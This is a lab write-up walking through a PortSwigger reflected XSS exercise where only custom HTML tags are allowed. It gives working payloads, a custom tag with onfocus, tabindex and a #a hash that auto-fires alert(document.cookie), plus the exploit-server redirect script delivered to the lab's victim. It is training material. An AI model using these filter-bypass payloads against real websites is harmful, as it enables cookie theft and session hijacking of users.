<h1 align="center"> Lab: Reflected XSS into HTML context with all tags blocked except custom ones </h1>

<img width="1000" height="500" alt="image" src="https://github.com/user-attachments/assets/ddd841c5-6eca-4de5-b10c-1ec1a4445fae" />


## Lab URL: https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-all-standard-tags-blocked


## Lab solution:
This lab blocks all HTML tags except custom ones.

To solve the lab, perform a cross-site scripting attack that injects a custom tag and automatically alerts `document.cookie`. 


# Start Lab Methodology:
<img width="1155" height="939" alt="image" src="https://github.com/user-attachments/assets/eb9ffa84-0305-4925-9e08-11b3d7cee8d3" />

- Access the lab:
<img width="1153" height="929" alt="image" src="https://github.com/user-attachments/assets/e6f50101-1dcd-47d6-948f-ca1e7ccd1460" />


- In this if i input:
````
<h1>
````
<img width="736" height="320" alt="image" src="https://github.com/user-attachments/assets/505377d2-685a-40c1-bef6-1caeea640cf6" />

- I see `Tag is not allowed`:
<img width="1037" height="193" alt="image" src="https://github.com/user-attachments/assets/cfd41dd1-aa18-4ea0-add7-244ebda7b0d5" />


- In this we need to try others lik:
````
<body>
````
<img width="750" height="344" alt="image" src="https://github.com/user-attachments/assets/98fde888-5151-42f4-9c27-7571dc28f01b" />

- I still see:
<img width="1014" height="217" alt="image" src="https://github.com/user-attachments/assets/2bd22a92-2102-4d2a-ad5d-2ef80974d6dd" />


- If i try others:
````
<k4n0ng-radar>
````
<img width="776" height="432" alt="image" src="https://github.com/user-attachments/assets/dd28941c-0ece-4ae5-8813-f4189993e013" />

- We see:
<img width="769" height="341" alt="image" src="https://github.com/user-attachments/assets/3d38226f-2cab-425a-8115-2625df663fb2" />


- After i want to view what that i input, first `Right-Click` -> `Inspect` or Press `F12`:
<img width="948" height="781" alt="image" src="https://github.com/user-attachments/assets/53d03e9d-6ecc-4909-abe4-b7c2618df41a" />

- This means you’re in HTML text context - not inside an attribute or script tag.
- And since the lab says:`blocks all HTML tags except custom ones`
→ We can inject custom HTML tags (like <xss>, <test>, etc.) and they won’t be stripped.



- After in this i search:
````
<k4n0ng-radar onclick=alert(document.cookie)>
````
<img width="753" height="320" alt="image" src="https://github.com/user-attachments/assets/d9e246dd-3572-4651-aa5d-2a4d5f26505a" />

- In this we seee nothing. but if i click on `"`:
<img width="786" height="331" alt="image" src="https://github.com/user-attachments/assets/ab162cd8-7149-4d37-84f0-beaac87880a7" />

- I try to click on it and now i see:
<img width="793" height="450" alt="image" src="https://github.com/user-attachments/assets/ef134bac-7582-4ead-9fdf-9b8b09b75fbd" />


- After click on `Go to exploit server`:
<img width="1202" height="495" alt="image" src="https://github.com/user-attachments/assets/34c5ec8c-a3f5-43c2-9b39-198201152073" />

<img width="991" height="952" alt="image" src="https://github.com/user-attachments/assets/17c422c5-2950-4430-8592-6aaddc017951" />


- After i delete text in body, and add our inject code:
<img width="1198" height="1032" alt="image" src="https://github.com/user-attachments/assets/21c328c5-fb94-4405-ac43-d4e11736e9a1" />

- After copy this:
````
https://0a6b002304bb659880de2b8700d30094.web-security-academy.net/?search=
````
<img width="1106" height="501" alt="image" src="https://github.com/user-attachments/assets/53ea3ed5-3c24-4958-adfd-31633eebd781" />

- After past to our `body`:
<img width="1000" height="835" alt="image" src="https://github.com/user-attachments/assets/16d00d12-8df8-45c6-9f8f-c4acd9c4f809" />

- After add payload that we can inject like above:
````
<k4n0ng-radar onfocus=alert(document.cookie)>
````
<img width="976" height="817" alt="image" src="https://github.com/user-attachments/assets/6efc5a1c-f2a0-4dd6-b2c5-5472dc6d17a0" />

- After i add `Hash`:
<img width="1657" height="545" alt="image" src="https://github.com/user-attachments/assets/129102e6-4a77-4d53-934b-83d85917757d" />

- To specific about `tabindex` -> go to browser: https://www.w3schools.com/tags/att_global_tabindex.asp 
<img width="1502" height="996" alt="image" src="https://github.com/user-attachments/assets/ea332591-0448-45a1-94c7-6cb7f14aa16a" />

- And in this i want to detail it:
<img width="1198" height="675" alt="image" src="https://github.com/user-attachments/assets/cd827dde-48b7-419d-ae42-12ae52704a38" />

<img width="1597" height="476" alt="image" src="https://github.com/user-attachments/assets/b6e02e7f-6b4d-4784-8c4e-1fe6fea93f02" />

- This HTML page demonstrates keyboard navigation using the tabindex attribute:
  - Three `<div>` elements are made focusable with `tabindex="1"`, `"3"`, and `"2"`.
  - The browser uses `tabindex` values to determine the tab order:
    - Lower numbers = earlier in tab order (`1` → `2` → `3`).
  - A script automatically focuses the first `<div>` when the page loads.
  - Users can then press Tab to navigate between focusable elements in order:
**W3Schools (1)** → **Microsoft (2)** → **Google (3)** → **Note paragraph (4)**.


- After go back to our `Browser`, and now we get:
````
<script>
location = 'https://0a6b002304bb659880de2b8700d30094.web-security-academy.net/?search=<k4n0ng-radar id=a onfocus=alert(document.cookie) tabindex=1>#a'
</script>
````
- After click `Store`:
<img width="966" height="815" alt="image" src="https://github.com/user-attachments/assets/c882edc5-148e-414a-94d2-51204d6c8a62" />

- After click on `Delivery exploit to victim`:
<img width="1854" height="890" alt="image" src="https://github.com/user-attachments/assets/b722d92b-86ad-4e59-96a5-aa7dec770c71" />

- Now we got successful to solve this lab.
<img width="519" height="141" alt="image" src="https://github.com/user-attachments/assets/a8d6125d-5c4f-43b5-a5e2-df05de5e2475" />

<img width="503" height="185" alt="image" src="https://github.com/user-attachments/assets/bfc44bfc-e524-4a32-be3c-f4293d19f8fb" />

<img width="1856" height="723" alt="image" src="https://github.com/user-attachments/assets/0750efb0-7529-468e-8221-f93a8dda0753" />



- we got successful to solve this lab.


---

<h2 align="center"> Finished Lab 15 XSS with custom tag restriction </h2>

<h2 align="center"> Autho: Nin Kanong (k4n0ng) </h2>

<h3 align="center"> Date: 5/12/2025 </h3>
